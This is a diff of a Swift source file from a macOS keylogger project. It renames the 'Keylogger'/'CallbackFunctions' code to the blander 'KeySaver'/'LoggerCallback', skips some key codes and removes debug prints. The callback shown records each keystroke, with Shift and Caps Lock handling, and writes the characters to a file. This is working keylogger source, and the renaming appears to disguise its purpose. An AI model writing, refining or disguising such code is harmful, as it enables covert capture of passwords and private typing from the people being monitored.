@@ -1,6 +1,6 @@
 //
-//  CallbackFunctions.swift
-//  Keylogger
+//  LoggerCallback.swift
+//  KeySaver
 //
 //  Created by Skrew Everything on 16/01/17.
 //  Copyright © 2017 Skrew Everything. All rights reserved.
@@ -9,7 +9,7 @@
 import Foundation
 import Cocoa
 
-class CallbackFunctions
+class LoggerCallback
 {
     static var CAPSLOCK = false
     static var SHIFT = false
@@ -68,11 +68,14 @@ class CallbackFunctions
         
         Outside:if pressed == 1 { // keydown
             if code == 57 { // Capslock
-                CallbackFunctions.CAPSLOCK = !CallbackFunctions.CAPSLOCK
+                LoggerCallback.CAPSLOCK = !LoggerCallback.CAPSLOCK
+                break Outside
+            }
+            if code >= 58 && code <= 83 || code == 41 || code == 42 {
                 break Outside
             }
             if code == 225 { // Shift
-                CallbackFunctions.SHIFT = true
+                LoggerCallback.SHIFT = true
                 break Outside
             }
             if code >= 224 && code <= 231 || command {
@@ -81,7 +84,8 @@ class CallbackFunctions
                 //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 break Outside
             }
-            if CallbackFunctions.CAPSLOCK || CallbackFunctions.SHIFT { // Show uppercase
+            
+            if LoggerCallback.CAPSLOCK || LoggerCallback.SHIFT { // Show uppercase
                 fh?.write(this.keyMap[code]![1].data(using: .utf8)!)
                 print(this.keyMap[code]![1].data(using: .utf8)!)
             } else { // Show lowercase
@@ -90,13 +94,11 @@ class CallbackFunctions
             }
         } else { // keyup
             if code == 225 { // no more shift
-                CallbackFunctions.SHIFT = false
+                LoggerCallback.SHIFT = false
                 break Outside
             }
             if code >= 224 && code <= 231 { // no more special keys
-                print(code)
                 command = false
-                print("end command")
                 //                fh?.write(")".data(using: .utf8)!)
                 //                print(")".data(using: .utf8)!)
             }
